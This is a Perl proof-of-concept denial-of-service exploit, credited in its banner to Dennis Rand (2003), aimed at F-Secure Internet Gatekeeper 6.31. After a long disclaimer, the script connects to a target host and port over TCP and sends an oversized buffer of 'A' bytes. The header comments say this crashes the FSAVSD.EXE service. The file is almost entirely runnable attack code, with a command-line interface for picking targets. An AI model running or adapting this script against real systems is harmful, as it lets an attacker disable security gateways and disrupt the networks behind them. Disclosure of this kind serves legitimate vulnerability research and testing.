#!/usr/bin/perl
#ooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOO
# 
#  ************************************************** !!! WARNING !!! ***********************************************************
#  *                                            FOR SECURITY TESTiNG ONLY!                                                      *
#  ******************************************************************************************************************************
#  * By using this code you agree that I makes no warranties or representations, express or implied, about the                  *
#  * accuracy, timeliness or completeness of this, including without limitations the implied warranties of                      *
#  * merchantability and fitness for a particular purpose.                                                                      *
#  * I makes NO Warranty of non-infringement. This code may contain technical inaccuracies or typographical errors.             *
#  * This code can never be copyrighted or owned by any commercial company, under no circumstances what so ever.                *
#  * but can be use for as long the developer, are giving explicit approval of the usage, and the user understand               *
#  * and approve of all the parts written in this notice.                                                                       *
#  * This program may NOT be used by any Danish company, unless explicit written permission from the developer .                *
#  * Neither myself nor any of my Affiliates shall be liable for any direct, incidental, consequential, indirect                *
#  * or punitive damages arising out of access to, inability to access, or any use of the content of this code,                 *
#  * including without limitation any PC, other equipment or other property, even if I am Expressly advised of                  *
#  * the possibility of such damages. I DO NOT encourage criminal activities. If you use this code or commit                    *
#  * criminal acts with it, then you are solely responsible for your own actions and by use, downloading,transferring,          *
#  * and/or reading anything from this code you are considered to have accepted the terms and conditions and have read          *
#  * this disclaimer. Once again this code is for penetration testing purposes only. And once again, DO NOT DISTRIBUTE!         *
#  ******************************************************************************************************************************
#
# Notes:
#   The more complex our security becomes, the more complex our enemy's 
#         efforts must be. The more we seek to shut him out, the better he must 
#         learn to become at breaking in. Each new level of security that we manage 
#         becomes no more than a stepping stone for him who would surpass us, for 
#         he bases his next assault upon our best defenses.
#
#
#       Tested on : 
#            - Windows 2000 Server SP4
#            - F-Secure Internet Gatekeeper 6.31 build 33
#       
#       The following error will end up in the event viewer: 
#               ------------------------------------------------------------------------ 
#               Event Type:     Information 
#               Event Source:   Application Popup
#               Event Category: None
#               Event ID:       26 
#               Description: 
#               Application popup: FSAVSD.EXE - Application Error : 
#                                  The exception unknown software exception (0xc00000fd) 
#                                  occurred in the application at location 0x0041e9d7.
#               ------------------------------------------------------------------------ 
#
use IO::Socket; 
use Getopt::Long; 

my $host_header; 
$target = "127.0.0.1";
$port   = "18971";

$shellcode_sp3 = join ("", 
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41",
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41",
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41",
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41",
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41",
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41",
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41",
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41",
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41",
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41",
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41",
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41",
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41",
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41",
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41",
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41",
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41",
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41",
"\x41\x41\x41\x41\x41\x41\x41"

);

$buf = join ($shellcode_sp3); 

GetOptions( 
        "target=s"      => \$target, 
        "port=i"        => \$port, 
        "exploit=s"     => \$exploit,
        "check"         => \$check,
        "help|?"        => sub { 
                                print "\n" x 90; 
                                print "\t #################################################\n"; 
                                print "\t #  F-Secure Internet Gatekeeper 6.31 build 33   #\n";
                                print "\t #                   PoC Exploit                 #\n"; 
                                print "\t #  ************* !!! WARNING !!! ************   #\n"; 
                                print "\t #  ************ DO NOT DISTRIBUTE ***********   #\n"; 
                                print "\t #  ** FOR PRIVATE AND EDUCATIONAL USE ONLY! *   #\n"; 
                                print "\t #  ******************************************   #\n"; 
                                print "\t #             (c)2003 by Dennis Rand            #\n";
                                print "\t #################################################\n"; 
                                print "\n\t -target\t\t eg.: 127.0.0.1\n"; 
                                print "\t -port\t\t\t eg.: 18791\n\n"; 
                                print "\tUsage eg.: DoS.pl -t 127.0.0.1 -p 18791\n"; 
                                exit; 
                                } 
); 

$error .= "Error: You must specify a target host\n" if ((!$target)); 
$error .= "Error: You must specify a port number\n" if ((!$port)); 

if ($error) 
{ 
   print "Try DoS.pl -help or -?' for more information.\n$error\n" ; 
   exit; 
} 


if ($target)
{ 
   print "\n" x 90; 
   print "\n\n"; 
   $host = $target; 
   attack(); 
}; 

sub attack 
{ 
   print "[*] Target system - F-Secure Internet Gatekeeper 6.31 build 33\n\n";
   print "[*] Target :\t\t\t $target\n";  
   print "[*] Port :\t\t\t $port\n";
   print "[*] Package Size :\t\t ".length($shellcode_sp3)." Bytes\n"; 
   print "[*] Connecting To Target\n"; 
   $| = 1; 

   my $connection = IO::Socket::INET->new(Proto =>"tcp", 
                                          PeerAddr =>$target, 
                                          PeerPort =>$port) || die "[*] Failed to connect to $target port $port\n";
 
   print "[*] Sending attack\n"; 
   print $connection "$buf\r\n\r\n"; 
   close $connection; 
   print "[*] Package Delivered\n";
   exit; 
};